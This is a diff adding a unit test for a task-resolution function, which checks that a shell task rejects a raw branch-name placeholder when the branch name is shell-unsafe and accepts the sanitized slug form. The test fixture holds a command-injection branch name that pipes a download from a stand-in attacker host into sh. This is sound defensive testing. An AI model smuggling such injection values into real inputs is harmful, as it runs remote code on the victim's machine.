@@ -112,6 +112,51 @@ describe('resolveTask', () => {
     })).toThrow('string commands require shell = true');
   });
 
+  test('refuses a shell task that uses the raw {branch} when the branch name is shell-unsafe, but allows {branch.slug}', () => {
+    const hostileContext = {
+      ...baseContext,
+      branch: "feat; curl attacker.example/x|sh #",
+      branchSlug: 'feat-curl-attacker-example-x-sh',
+    };
+
+    expect(() => resolveTask({
+      config: { tasks: { legacy: { run: 'echo building {branch} && ./build.sh', shell: true } } },
+      taskName: 'legacy',
+      isMain: true,
+      context: hostileContext,
+    })).toThrow(WtmTaskResolutionError);
+    expect(() => resolveTask({
+      config: { tasks: { legacy: { run: 'echo building {branch} && ./build.sh', shell: true } } },
+      taskName: 'legacy',
+      isMain: true,
+      context: hostileContext,
+    })).toThrow('{branch.slug}');
+
+    // The same hostile branch name is fine through {branch.slug}, which is already sanitized...
+    expect(resolveTask({
+      config: { tasks: { legacy: { run: 'echo building {branch.slug} && ./build.sh', shell: true } } },
+      taskName: 'legacy',
+      isMain: true,
+      context: hostileContext,
+    }).argv).toEqual(['echo building feat-curl-attacker-example-x-sh && ./build.sh']);
+
+    // ...and the raw {branch} is fine outside a shell task, since it never reaches `sh -c`.
+    expect(resolveTask({
+      config: { tasks: { dev: { main: ['make', 'dev-{branch}'] } } },
+      taskName: 'dev',
+      isMain: true,
+      context: hostileContext,
+    }).argv).toEqual(['make', 'dev-feat; curl attacker.example/x|sh #']);
+
+    // And an ordinary branch name passes straight through a shell task unchanged.
+    expect(resolveTask({
+      config: { tasks: { legacy: { run: 'echo building {branch}', shell: true } } },
+      taskName: 'legacy',
+      isMain: true,
+      context: baseContext,
+    }).argv).toEqual(['echo building main']);
+  });
+
   test('rejects missing tasks and context-specific commands with typed configuration errors', () => {
     expect(() => resolveTask({
       config: { tasks: {} },
